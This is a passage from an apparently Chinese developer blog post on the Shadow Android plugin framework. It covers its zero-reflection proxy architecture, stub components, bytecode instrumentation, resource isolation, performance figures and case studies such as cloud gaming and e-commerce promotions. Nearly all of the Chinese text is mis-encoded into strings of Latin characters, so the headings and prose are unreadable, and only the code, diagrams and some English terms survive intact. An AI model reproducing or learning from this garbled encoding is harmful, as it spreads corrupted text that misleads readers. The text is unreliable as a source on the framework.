åŠ¨æ€åŒ–</strong></td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>æ’ä»¶è°ƒè¯•debug</strong></td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr></tbody></table>
<h2 data-id="heading-14">äº”ã€Shadowæ˜¯å¦‚ä½•è§£å†³è¡Œä¸šéš¾é¢˜çš„ï¼Ÿ</h2>
<h3 data-id="heading-15">1. <strong>é›¶åå°„å¦‚ä½•å®ç°ï¼Ÿ</strong></h3>
<p>é€šè¿‡<strong>ç¼–è¯‘æœŸä»£ç ç”Ÿæˆ + æ¥å£ä»£ç†</strong>æ›¿ä»£è¿è¡Œæ—¶åå°„ã€‚ä¾‹å¦‚ï¼Œæ’ä»¶ä¸­çš„<code>getApplicationContext()</code>è¢«ASMé‡å†™ä¸ºè°ƒç”¨<code>ShadowApplication.getPluginContext()</code>ï¼Œå…¨ç¨‹æ— åå°„ã€‚</p>
<p><strong>åº”å¯¹ç³»ç»Ÿç¢ç‰‡åŒ–ä¸å…¼å®¹æ€§æŒ‘æˆ˜</strong></p>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šAndroidç³»ç»Ÿç‰ˆæœ¬å’Œå‚å•†ROMï¼ˆå¦‚å°ç±³ã€åä¸ºã€OPPOï¼‰çš„ç¢ç‰‡åŒ–ï¼Œå¯¼è‡´ä»»ä½•ç³»ç»ŸAPIçš„éå¸¸è§„ä½¿ç”¨ï¼ˆå¦‚Hookï¼‰éƒ½é¢ä¸´å·¨å¤§çš„å…¼å®¹æ€§é£é™©ã€‚è®¸å¤šæ—§çš„æ’ä»¶åŒ–æ–¹æ¡ˆåœ¨æ–°ç³»ç»Ÿä¸Šé¢‘ç¹å´©æºƒã€‚</li>
<li><strong>Shadowçš„é’ˆå¯¹æ€§è§£æ³•</strong>ï¼šé‡‡ç”¨<strong>é›¶åå°„ã€é›¶Hook</strong>çš„çº¯"ä»£ç†"æ¶æ„ã€‚å®ƒä¸è¯•å›¾"æ¬ºéª—"æˆ–"åŠ«æŒ"ç³»ç»Ÿï¼Œè€Œæ˜¯é€šè¿‡é¢„åŸ‹åˆæ³•ç»„ä»¶å’Œæ¥å£è½¬å‘ï¼Œä¸ç³»ç»Ÿåˆè§„åœ°åä½œï¼Œä»è€Œå®ç°äº†æé«˜çš„å…¼å®¹æ€§å’Œç¨³å®šæ€§ã€‚è¿™æ˜¯Shadowè§£å†³çš„æ ¸å¿ƒæŠ€æœ¯ç—›ç‚¹ã€‚</li>
</ul>
<h3 data-id="heading-16">2. <strong>æ’ä»¶åŠ è½½æ€§èƒ½å¦‚ä½•ï¼ŒåŠ è½½é€Ÿåº¦ï¼Ÿ</strong></h3>
<ul>
<li>å†·å¯åŠ¨ï¼ˆé¦–æ¬¡åŠ è½½ï¼‰ï¼šçº¦200ï½400msï¼ˆå–å†³äºæ’ä»¶å¤§å°ï¼‰ï¼›</li>
<li>çƒ­å¯åŠ¨ï¼ˆå·²ç¼“å­˜ï¼‰ï¼šâ‰ˆåŸç”ŸActivityå¯åŠ¨æ—¶é—´ï¼›</li>
<li>æ”¯æŒ<strong>é¢„åŠ è½½</strong>ä¸<strong>åå°ä¸‹è½½</strong>ï¼Œç”¨æˆ·ä½“éªŒæ— æ„Ÿã€‚</li>
</ul>
<h3 data-id="heading-17">3. <strong>å†…å­˜å ç”¨å¯¹æ¯”</strong></h3>





















<table><thead><tr><th>åœºæ™¯</th><th>å†…å­˜å¢é‡</th></tr></thead><tbody><tr><td>åŸç”ŸActivity</td><td>åŸºå‡†</td></tr><tr><td>Shadowæ’ä»¶Activity</td><td>+8ï½12MB</td></tr><tr><td>VirtualAppè™šæ‹Ÿç¯å¢ƒ</td><td>+30MB+</td></tr></tbody></table>
<h3 data-id="heading-18">4. <strong>å®‰å…¨é£é™©å¯æ§å—ï¼Ÿ</strong></h3>
<ul>
<li>æ’ä»¶æ— æ³•ç›´æ¥è®¿é—®å®¿ä¸»ç§æœ‰ç±»ï¼›</li>
<li>æ‰€æœ‰è·¨æ¨¡å—è°ƒç”¨å¿…é¡»é€šè¿‡<code>@PluginInterface</code>å®šä¹‰çš„æ¥å£ï¼›</li>
<li>å®¿ä¸»å¯å¯¹æ’ä»¶è¿›è¡Œ<strong>ç­¾åæ ¡éªŒ + ç™½åå•æ§åˆ¶</strong>ï¼Œé˜²æ­¢æ¶æ„ä»£ç æ³¨å…¥ã€‚</li>
</ul>
<h3 data-id="heading-19">5. <strong>ç¨³å®šæ€§</strong>ï¼šæ’ä»¶å´©æºƒå¯¹å®¿ä¸»åº”ç”¨çš„å½±å“æ§åˆ¶</h3>
<ul>
<li>æ”¯æŒæ’ä»¶ç‹¬ç«‹å®‰è£…ã€æ›´æ–°ã€å¸è½½</li>
<li>æ’ä»¶é—´å®Œå…¨éš”ç¦»ï¼Œäº’ä¸å½±å“</li>
<li>å®¿ä¸»å¯¹æ’ä»¶æœ‰å®Œå…¨æ§åˆ¶æƒ</li>
</ul>
<h3 data-id="heading-20">6. <strong>å®ç°çœŸæ­£çš„æ¨¡å—åŒ–ä¸åŠ¨æ€æ›´æ–°</strong></h3>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šAndroidå®˜æ–¹çš„åŠ¨æ€åŠŸèƒ½æ¨¡å—ï¼ˆDynamic Feature Modulesï¼‰å’ŒApp Bundleæ–¹æ¡ˆï¼Œåœ¨å›½å†…ç¼ºä¹Google PlayæœåŠ¡çš„ç¯å¢ƒä¸‹å‡ ä¹ä¸å¯ç”¨ã€‚ä¸”å…¶åŠ¨æ€æ€§å—å¹³å°ä¸¥æ ¼é™åˆ¶ã€‚</li>
<li><strong>æ’ä»¶åŒ–è§£æ³•</strong>ï¼šæä¾›äº†ä¸€ä¸ª<strong>ä¸ä¾èµ–Google Play</strong>çš„ã€åŠŸèƒ½æ›´å¼ºå¤§çš„å›½äº§åŒ–åŠ¨æ€åŒ–æ–¹æ¡ˆã€‚å®ƒå¯ä»¥åŠ¨æ€åŠ è½½ä»£ç ã€èµ„æºï¼Œç”šè‡³å››å¤§ç»„ä»¶ï¼Œçªç ´äº†å®˜æ–¹æ–¹æ¡ˆçš„è¯¸å¤šçº¦æŸã€‚</li>
</ul>
<h3 data-id="heading-21">7. å¦‚æœæƒ³è¦åŠ å›ºæ€ä¹ˆåŠï¼Ÿæ˜¯å¦å—åˆ°å½±å“</h3>
<ul>
<li><strong>ä¸ä¼š</strong>ã€‚Shadowçš„æ ¸å¿ƒé€»è¾‘åœ¨<strong>å®¿ä¸»å®¹å™¨ + æ’ä»¶è¿è¡Œæ—¶</strong>ï¼Œå³ä½¿æ’ä»¶è¢«åç¼–è¯‘ï¼Œä¹Ÿæ— æ³•ç›´æ¥è¿è¡Œï¼ˆç¼ºå°‘å®¿ä¸»ç¯å¢ƒå’Œæ¥å£å¥‘çº¦ï¼‰ã€‚</li>
<li>åŠ å›ºåè€Œèƒ½<strong>å¢å¼ºæ’ä»¶å®‰å…¨æ€§</strong>ï¼Œé˜²æ­¢æ¶æ„ç¯¡æ”¹æ’ä»¶é€»è¾‘æˆ–æ³¨å…¥ä»£ç ã€‚</li>
<li>è‹¥æ’ä»¶è¢«ç¯¡æ”¹ï¼Œå®¿ä¸»å¯é€šè¿‡<strong>ç­¾åæ ¡éªŒ + ç™½åå•</strong>æ‹’ç»åŠ è½½ï¼Œå½¢æˆåŒé‡é˜²æŠ¤ã€‚</li>
</ul>
<p><strong>åŠ å›ºä¸ä»…ä¸ä¼šå½±å“Shadowï¼Œåè€Œèƒ½ä¸å…¶å½¢æˆäº’è¡¥ï¼Œæ„å»ºæ›´å®‰å…¨ã€ç¨³å®šã€åˆè§„çš„åŠ¨æ€åŒ–æ¶æ„</strong>ã€‚</p>
<h3 data-id="heading-22">8. <strong>ç»•è¿‡65536æ–¹æ³•æ•°é™åˆ¶</strong></h3>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šåœ¨Multidexæ™®åŠå‰ï¼Œå•ä¸ªDexæ–‡ä»¶çš„æ–¹æ³•æ•°ä¸Šé™æ˜¯65536ã€‚å¤§å‹åº”ç”¨å¾ˆå®¹æ˜“è§¦ç¢°æ­¤å¤©èŠ±æ¿ã€‚</li>
<li><strong>æ’ä»¶åŒ–è§£æ³•</strong>ï¼šå°†ä»£ç æ‹†åˆ†åˆ°å¤šä¸ªæ’ä»¶APKä¸­ï¼Œæ¯ä¸ªæ’ä»¶æœ‰è‡ªå·±çš„Dexæ–‡ä»¶ï¼Œè‡ªç„¶è§„é¿äº†æ­¤é™åˆ¶ã€‚è™½ç„¶ç°åœ¨Multidexå·²æˆä¸ºæ ‡å‡†è§£å†³æ–¹æ¡ˆï¼Œä½†æ’ä»¶åŒ–åœ¨ä»£ç ç»„ç»‡ä¸Šæä¾›äº†æ›´å½»åº•çš„åˆ†ç¦»ã€‚</li>
</ul>
<h2 data-id="heading-23">å…­ã€ä¸ºä»€ä¹ˆè¢«ç§°ä¸º"ç»ˆææ–¹æ¡ˆ"ï¼Ÿ</h2>



































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>ä¼ ç»Ÿæ’ä»¶æ¡†æ¶ï¼ˆå¦‚RePluginã€VirtualAPKï¼‰</th><th>Shadow</th></tr></thead><tbody><tr><td><strong>æ˜¯å¦ä½¿ç”¨åå°„/Hook</strong></td><td>æ˜¯ï¼ˆå¤§é‡ä¾èµ–ï¼‰</td><td>å¦ï¼ˆé›¶åå°„ï¼‰</td></tr><tr><td><strong>æ˜¯å¦å…¼å®¹Android 9+</strong></td><td>éƒ¨åˆ†å¤±æ•ˆæˆ–éœ€é€‚é…</td><td>åŸç”Ÿå…¼å®¹</td></tr><tr><td><strong>æ¡†æ¶èƒ½å¦åŠ¨æ€æ›´æ–°</strong></td><td>å¦ï¼ˆéœ€éšå®¿ä¸»å‘å¸ƒï¼‰</td><td>æ˜¯ï¼ˆå…¨åŠ¨æ€ï¼‰</td></tr><tr><td><strong>ç³»ç»Ÿç¨³å®šæ€§é£é™©</strong></td><td>é«˜ï¼ˆæ˜“Crashï¼‰</td><td>æä½</td></tr><tr><td><strong>Google Playåˆè§„æ€§</strong></td><td>å­˜ç–‘</td><td>å®Œå…¨åˆè§„</td></tr></tbody></table>
<p>æ­£æ˜¯è¿™ç§**"ä¸ä¸ç³»ç»Ÿå¯¹æŠ—ï¼Œè€Œæ˜¯é¡ºåº”ç³»ç»Ÿè®¾è®¡"**çš„å“²å­¦ï¼Œè®©Shadowåœ¨é•¿æœŸç»´æŠ¤æ€§å’Œè·¨å‚å•†å…¼å®¹æ€§ä¸Šè¿œè¶…åŒç±»æ–¹æ¡ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a33ccf64eae41fba9851beecdb8b800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP56iL5Y2B5YWr5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040496&amp;x-signature=mXZF2pG2HVWGd%2Bx3bspYFZmxhho%3D" alt="1142.jpg" loading="lazy"/></p>
<h2 data-id="heading-24">ä¸ƒã€Shadowæ¶æ„è§£æ</h2>
<h3 data-id="heading-25">æ¶æ„åˆ†å±‚</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "ä¸šåŠ¡å±‚"
        P1[ç‹¬ç«‹æ’ä»¶APK 1]
        P2[ç‹¬ç«‹æ’ä»¶APK 2]
        P3[...]
        P4[ç‹¬ç«‹æ’ä»¶APK N]
    end
    
    subgraph "æ ¸å¿ƒå±‚ Shadow Core"
        M[manageræ¨¡å—]
        L[loaderæ¨¡å—]
        R[runtimeæ¨¡å—]
        
        M --&gt;|æ’ä»¶ç®¡ç†| L
        L --&gt;|åŠ è½½æ’ä»¶| R
    end
    
    subgraph "å®¿ä¸»å®¹å™¨ Shadow Container"
        SA[Stub Activity]
        SS[Stub Service]
        SB[Stub Broadcast]
        SC[Stub ContentProvider]
    end
    
    P1 --&gt;|åŠ¨æ€åŠ è½½| M
    P2 --&gt;|åŠ¨æ€åŠ è½½| M
    P4 --&gt;|åŠ¨æ€åŠ è½½| M
    
    R --&gt;|æ¥å£è°ƒç”¨| SA
    R --&gt;|æ¥å£è°ƒç”¨| SS
    R --&gt;|æ¥å£è°ƒç”¨| SB
    R --&gt;|æ¥å£è°ƒç”¨| SC
    
    SA --&gt;|ç³»ç»Ÿè°ƒç”¨| OS[Androidç³»ç»Ÿæ¡†æ¶]
    SS --&gt;|ç³»ç»Ÿè°ƒç”¨| OS
    SB --&gt;|ç³»ç»Ÿè°ƒç”¨| OS
    SC --&gt;|ç³»ç»Ÿè°ƒç”¨| OS
</code></pre>
<h3 data-id="heading-26">ä¸‰å¤§æ ¸å¿ƒæ¨¡å—</h3>
<ol>
<li>
<p><strong><code>manager</code></strong><br/>
è´Ÿè´£æ’ä»¶çš„ä¸‹è½½ã€ç‰ˆæœ¬ç®¡ç†ã€ç”Ÿå‘½å‘¨æœŸæ§åˆ¶ã€‚</p>
</li>
<li>
<p><strong><code>loader</code></strong><br/>
åŠ è½½æ’ä»¶APKï¼Œåˆ›å»ºç‹¬ç«‹çš„<code>DexClassLoader</code>å’Œ<code>Resources</code>ï¼Œå®Œæˆèµ„æºä¸ä»£ç éš”ç¦»ã€‚</p>
</li>
<li>
<p><strong><code>runtime</code></strong><br/>
æä¾›è¿è¡Œæ—¶ä»£ç†ç±»ï¼ˆå¦‚<code>PluginActivity</code>ï¼‰ï¼Œé€šè¿‡æ¥å£ä¸æ’ä»¶é€šä¿¡ï¼Œå±è”½ç³»ç»Ÿå·®å¼‚ã€‚</p>
</li>
</ol>
<p>Shadowçš„æ ¸å¿ƒæ€æƒ³æ˜¯**"ä»£ç†è½¬å‘ + å­—èŠ‚ç ä¿®æ”¹"**ï¼Œè€Œé"æ¬ºéª—ç³»ç»Ÿ"ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdc96fd9e9bd4b00a78dcdad669c4d73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP56iL5Y2B5YWr5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040496&amp;x-signature=k8elvhPpEVGeK283hUp4o%2FGpgdU%3D" alt="1148.png" loading="lazy"/></p>
<h3 data-id="heading-27">å…³é”®æŠ€æœ¯ç‚¹</h3>
<ul>
<li><strong>Stub Activityå ä½</strong>ï¼šåœ¨å®¿ä¸»Manifestä¸­é¢„åŸ‹ç©ºå£³Activityï¼Œç”¨äºç»•è¿‡AMSçš„ç»„ä»¶åˆæ³•æ€§æ ¡éªŒï¼›</li>
<li><strong>å­—èŠ‚ç æ’æ¡©ï¼ˆTransform + ASMï¼‰</strong>ï¼šåœ¨ç¼–è¯‘æœŸè‡ªåŠ¨é‡å†™æ’ä»¶ä»£ç ï¼Œå°†<code>this.startActivity()</code>è½¬ä¸º<code>ShadowContext.startActivity()</code>ï¼›</li>
<li><strong>èµ„æºIDå›ºå®šåŒ–</strong>ï¼šé€šè¿‡è‡ªå®šä¹‰aapt2æ’ä»¶ï¼Œç¡®ä¿æ’ä»¶èµ„æºIDåœ¨ä¸åŒæ„å»ºä¸­ä¿æŒä¸€è‡´ï¼Œé¿å…å†²çªã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78870630a2764af9831a7af8460cbd06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP56iL5Y2B5YWr5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040496&amp;x-signature=UwZLvdQ1ceV9WmTpj8Adq3OX2%2FA%3D" alt="1143.png" loading="lazy"/></p>
<h4 data-id="heading-28">1. çœŸæ­£çš„å››å¤§ç»„ä»¶åŠ¨æ€åŒ–</h4>
<p>Shadowå®ç°äº†Activityã€Serviceã€BroadcastReceiverã€ContentProviderå››å¤§ç»„ä»¶çš„å®Œæ•´åŠ¨æ€åŒ–ï¼Œæ— éœ€åœ¨å®¿ä¸»Manifestä¸­é¢„æ³¨å†Œã€‚</p>
<p><strong>æŠ€æœ¯å®ç°äº®ç‚¹</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>Transform</code>æŠ€æœ¯ä¿®æ”¹å­—èŠ‚ç </li>
<li>åŠ¨æ€ç”Ÿæˆç»„ä»¶ä»£ç†ä»£ç </li>
<li>è¿è¡Œæ—¶æ³¨å†Œç»„ä»¶ä¿¡æ¯</li>
</ul>
<h4 data-id="heading-29">2. èµ„æºéš”ç¦»ä¸å…±äº«æœºåˆ¶</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Shadowçš„èµ„æºç®¡ç†ç¤ºä¾‹</span>
<span class="hljs-type">Resources</span> <span class="hljs-variable">hostResources</span> <span class="hljs-operator">=</span> getResources();
<span class="hljs-type">Resources</span> <span class="hljs-variable">pluginResources</span> <span class="hljs-operator">=</span> pluginContext.getResources();

<span class="hljs-comment">// æ’ä»¶èµ„æºå®Œå…¨éš”ç¦»ï¼Œé¿å…IDå†²çª</span>
<span class="hljs-type">int</span> <span class="hljs-variable">pluginResourceId</span> <span class="hljs-operator">=</span> pluginResources.getIdentifier(
    <span class="hljs-string">"plugin_string"</span>, <span class="hljs-string">"string"</span>, pluginPackageName
);
</code></pre>
<p>Shadowé‡‡ç”¨ç‹¬ç«‹çš„Resourceså’ŒAssetManagerå®ä¾‹ä¸ºæ¯ä¸ªæ’ä»¶åˆ›å»ºèµ„æºç©ºé—´ï¼ŒåŒæ—¶æ”¯æŒèµ„æºå…±äº«éœ€æ±‚ã€‚</p>
<h4 data-id="heading-30">3. æ’ä»¶Activityå¯åŠ¨æµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant ç”¨æˆ·
    participant å®¿ä¸»StubActivity
    participant Shadow Runtime
    participant æ’ä»¶Activity
    participant AMS[ActivityManagerService]
    
    ç”¨æˆ·-&gt;&gt;å®¿ä¸»StubActivity: ç‚¹å‡»å¯åŠ¨æ’ä»¶Activity
    å®¿ä¸»StubActivity-&gt;&gt;Shadow Runtime: è°ƒç”¨startPluginActivity()
    
    alt æ’ä»¶æœªåŠ è½½
        Shadow Runtime-&gt;&gt;Shadow Runtime: åŠ è½½æ’ä»¶APK
        Shadow Runtime-&gt;&gt;Shadow Runtime: åˆ›å»ºæ’ä»¶ClassLoader
        Shadow Runtime-&gt;&gt;Shadow Runtime: åˆ›å»ºæ’ä»¶Resources
    end
    
    Shadow Runtime-&gt;&gt;æ’ä»¶Activity: åˆ›å»ºæ’ä»¶Activityå®ä¾‹
    Shadow Runtime-&gt;&gt;æ’ä»¶Activity: è°ƒç”¨attachBaseContext()
    Shadow Runtime-&gt;&gt;æ’ä»¶Activity: è°ƒç”¨onCreate()
    
    æ’ä»¶Activity-&gt;&gt;æ’ä»¶Activity: æ­£å¸¸æ‰§è¡Œä¸šåŠ¡é€»è¾‘
    æ’ä»¶Activity--&gt;&gt;ç”¨æˆ·: æ˜¾ç¤ºç•Œé¢ï¼Œä¸ç”¨æˆ·äº¤äº’
    
    ç”¨æˆ·-&gt;&gt;æ’ä»¶Activity: ç‚¹å‡»è¿”å›
    æ’ä»¶Activity-&gt;&gt;Shadow Runtime: finish()
    Shadow Runtime-&gt;&gt;å®¿ä¸»StubActivity: é”€æ¯å ä½Activity
    å®¿ä¸»StubActivity-&gt;&gt;AMS: é€šçŸ¥AMSé”€æ¯
</code></pre>
<h2 data-id="heading-31">å…«ã€çœŸå®æ¡ˆä¾‹ï¼šShadowåœ¨å¤§å‹é¡¹ç›®ä¸­çš„åº”ç”¨å›¾è°±</h2>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤§å‹Appã€é‡‘è/ç¤¾äº¤ç±»åº”ç”¨ã€éœ€ä¸Šæ¶Google Playçš„äº§å“</p>
<h3 data-id="heading-32">ğŸ“± æ¡ˆä¾‹1ï¼šäº‘æ¸¸æˆå¹³å°åŠ¨æ€åŠ è½½</h3>
<ul>
<li>
<p><strong>éœ€æ±‚</strong>ï¼šäº‘æ¸¸æˆSDKé¢‘ç¹è¿­ä»£ï¼ŒUIé€»è¾‘å¤æ‚ï¼Œéœ€å¿«é€Ÿä¸Šçº¿æ–°æ¸¸æˆã€‚</p>
</li>
<li>
<p><strong>æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>å°†æ•´ä¸ªäº‘æ¸¸æˆæ¨¡å—ï¼ˆSDK + UIï¼‰æ‰“åŒ…ä¸ºShadowæ’ä»¶ï¼›</li>
<li>å®¿ä¸»Appä»CDNä¸‹è½½æœ€æ–°æ’ä»¶ZIPï¼›</li>
<li>åŠ¨æ€åŠ è½½å¹¶å¯åŠ¨ï¼Œå®ç°"<strong>æ— éœ€å‘ç‰ˆï¼Œç§’çº§æ›´æ–°</strong>"ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ•ˆæœ</strong>ï¼šç‰ˆæœ¬è¿­ä»£å‘¨æœŸä»2å‘¨ç¼©çŸ­è‡³1å¤©ï¼Œå´©æºƒç‡ä¸‹é™60%ã€‚</p>
</li>
</ul>
<h3 data-id="heading-33">ğŸ’³ æ¡ˆä¾‹2ï¼šé‡‘èAppè¥é”€æ´»åŠ¨æ¨¡å—</h3>
<ul>
<li>
<p><strong>éœ€æ±‚</strong>ï¼šåŒ11ã€æ˜¥èŠ‚çº¢åŒ…ç­‰æ´»åŠ¨éœ€ç‹¬ç«‹å¼€å‘ã€å¿«é€Ÿä¸Šçº¿ã€æ´»åŠ¨ç»“æŸåç«‹å³ä¸‹çº¿ã€‚</p>
</li>
<li>
<p><strong>æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªæ´»åŠ¨æ‰“åŒ…ä¸ºç‹¬ç«‹æ’ä»¶ï¼›</li>
<li>é€šè¿‡é…ç½®ä¸­å¿ƒæ§åˆ¶æ’ä»¶å¼€å…³ä¸ç‰ˆæœ¬ï¼›</li>
<li>ç”¨æˆ·æ‰“å¼€æ´»åŠ¨é¡µæ—¶ï¼ŒæŒ‰éœ€åŠ è½½å¯¹åº”æ’ä»¶ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ•ˆæœ</strong>ï¼šä¸»åŒ…ä½“ç§¯å‡å°‘15MBï¼Œæ´»åŠ¨ä¸Šçº¿æ•ˆç‡æå‡5å€ã€‚</p>
</li>
</ul>
<h3 data-id="heading-34">ğŸ›’ æ¡ˆä¾‹3ï¼šç”µå•†Appæ¨¡å—åŒ–å¼€å‘</h3>
<ul>
<li>å•†å“è¯¦æƒ…ã€è´­ç‰©è½¦ã€ç›´æ’­ç­‰æ¨¡å—æ‹†åˆ†ä¸ºæ’ä»¶ï¼›</li>
<li>å„å›¢é˜Ÿå¹¶è¡Œå¼€å‘ï¼Œäº’ä¸å½±å“ï¼›</li>
<li>æ”¯æŒç°åº¦å‘å¸ƒä¸A/Bæµ‹è¯•ã€‚</li>
</ul>
<h3 data-id="heading-35">ç»¼åˆçš„æ¡ˆä¾‹å®æˆ˜ï¼šä¼šåœ¨åé¢çš„æ–‡ç« è¯¦ç»†ä»‹ç»ï¼ŒåŒ…å«8å¤§åŸºæœ¬ç‰¹æ€§ï¼</h3>
<p>åœ¨å¤§å‹ç”µå•†å¹³å°åŒ11ä¸­çš„åº”ç”¨ï¼šç”¨shadowï¼Œå®ç°äº†ä»¥ä¸‹7ç‚¹éœ€æ±‚ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åŠ¨æ€åŠ è½½ä¸€ä¸ªAPK, æ–°å¢ä¸€ä¸ªActivity
   å››å¤§ç»„ä»¶æ”¯æŒæƒ…å†µï¼šActivityå®Œå…¨æ”¯æŒï¼ŒService/Broadcast/ContentProviderçš„é™åˆ¶ä¸æ›¿ä»£æ–¹æ¡ˆ
<span class="hljs-bullet">2.</span> çƒ­ä¿®å¤ä¸€ä¸ªç±»
<span class="hljs-bullet">3.</span> çƒ­ä¿®å¤æ›¿æ¢ä¸€ä¸ªèµ„æºæ–‡ä»¶
   æ’ä»¶å†…ä½¿ç”¨è‡ªå·±çš„èµ„æºï¼Œé¿å…å†²çª
<span class="hljs-bullet">4.</span> çƒ­ä¿®å¤ä¸€ä¸ªso
<span class="hljs-bullet">5.</span> å¦‚ä½•æ›´æ–°ï¼šå¤šæ’ä»¶ç®¡ç†ã€ç‰ˆæœ¬æ§åˆ¶ä¸çƒ­æ›´æ–°ç­–ç•¥ï¼å®¿ä¸»çš„ç‰ˆæœ¬å’Œæ’ä»¶å¦‚æœè¦æ›´æ–°æ€ä¹ˆæ ·
   æ’ä»¶åŠ¨æ€æ›´æ–°ç­–ç•¥
   å¤šæ’ä»¶ç®¡ç†ï¼šåŒæ—¶åŠ è½½å¤šä¸ªæ’ä»¶çš„ç­–ç•¥
<span class="hljs-bullet">6.</span> å®¿ä¸»ä¸æ’ä»¶ä¹‹é—´å¦‚ä½•é«˜æ•ˆé€šä¿¡ï¼Ÿ
   æ’ä»¶ä¸å®¿ä¸»é€šä¿¡ï¼šé€šè¿‡é¢„å®šä¹‰æ¥å£ï¼ˆServiceã€Callbackï¼‰å®ç°åŒå‘è°ƒç”¨
   å¦‚ä½•ä½¿ç”¨Fragment?
<span class="hljs-bullet">7.</span> åŒ11æ´»åŠ¨ç»“æŸå¦‚ä½•å¸è½½æ’ä»¶
</code></pre>
<p>å‚è€ƒåšå®¢ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2180899" target="_blank" title="https://cloud.tencent.com/developer/article/2180899" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/aâ€¦</a></p>
<h2 data-id="heading-36">ä¹ã€æ€»ç»“ä¸å±•æœ›</h2>
<p>Shadowä½œä¸ºç¬¬ä¸‰ä»£æ’ä»¶åŒ–æ¡†æ¶çš„ä»£è¡¨ï¼Œé€šè¿‡<strong>é›¶åå°„ã€é›¶Hookã€å…¨åŠ¨æ€</strong>çš„æ ¸å¿ƒè®¾è®¡ï¼ŒæˆåŠŸè§£å†³äº†Androidæ’ä»¶åŒ–çš„ä¸‰å¤§å†å²éš¾é¢˜ï¼š</p>
<ol>
<li><strong>åˆè§„æ€§é—®é¢˜</strong>ï¼šå®Œå…¨éµå¾ªGoogle Playæ”¿ç­–ï¼Œå¯ä¸Šæ¶å…¨çƒå¸‚åœº</li>
<li><strong>å…¼å®¹æ€§é—®é¢˜</strong>ï¼šåŸç”Ÿæ”¯æŒAndroid 5.0åˆ°Android 14ï¼Œé€‚é…å„å¤§å‚å•†ROM</li>
<li><strong>æ€§èƒ½é—®é¢˜</strong>ï¼šå¯åŠ¨é€Ÿåº¦å¿«ã€å†…å­˜å ç”¨ä½ã€ä¸å½±å“å®¿ä¸»ç¨³å®šæ€§</li>
</ol>
<h3 data-id="heading-37">Shadowçš„é€‚ç”¨åœºæ™¯å»ºè®®</h3>
<ul>
<li>âœ… <strong>å¼ºçƒˆæ¨è</strong>ï¼šéœ€è¦ä¸Šæ¶Google Play/æµ·å¤–å¸‚åœºçš„åº”ç”¨</li>
<li>âœ… <strong>å¼ºçƒˆæ¨è</strong>ï¼šå¤§å‹å›¢é˜Ÿéœ€è¦æ¨¡å—åŒ–å¹¶è¡Œå¼€å‘çš„åœºæ™¯</li>
<li>âœ… <strong>æ¨è</strong>ï¼šéœ€è¦é¢‘ç¹æ›´æ–°åŠŸèƒ½æ¨¡å—çš„ä¸šåŠ¡</li>
<li>âš ï¸ <strong>è°¨æ…ä½¿ç”¨</strong>ï¼šå¯¹å¯åŠ¨é€Ÿåº¦æœ‰æè‡´è¦æ±‚ï¼ˆ&lt;100msï¼‰çš„åœºæ™¯</li>
<li>âŒ <strong>ä¸æ¨è</strong>ï¼šä»…éœ€è¦ç®€å•çƒ­ä¿®å¤åŠŸèƒ½çš„å°å‹åº”ç”¨</li>
</ul>
<h3 data-id="heading-38">æœªæ¥å‘å±•æ–¹å‘</h3>
<p>éšç€Androidç”Ÿæ€çš„æ¼”è¿›ï¼ŒShadowä¹Ÿåœ¨æŒç»­ä¼˜åŒ–ï¼š</p>
<ol>
<li><strong>å¯¹Androidæ–°ç‰¹æ€§çš„æ”¯æŒ</strong>ï¼šé€‚é…æ–°çš„APIå’Œæ¶æ„å˜åŒ–</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šè¿›ä¸€æ­¥å‡å°‘æ’ä»¶åŒ–å¸¦æ¥çš„å¼€é”€</li>
<li><strong>å¼€å‘ä½“éªŒæå‡</strong>ï¼šæä¾›æ›´å¥½çš„è°ƒè¯•å’Œå¼€å‘å·¥å…·</li>
<li><strong>ç”Ÿæ€å»ºè®¾</strong>ï¼šå»ºç«‹æ’ä»¶å¸‚åœºã€è§„èŒƒæ’ä»¶æ¥å£æ ‡å‡†</li>
</ol>
<h2 data-id="heading-39">ç»“è¯­</h2>
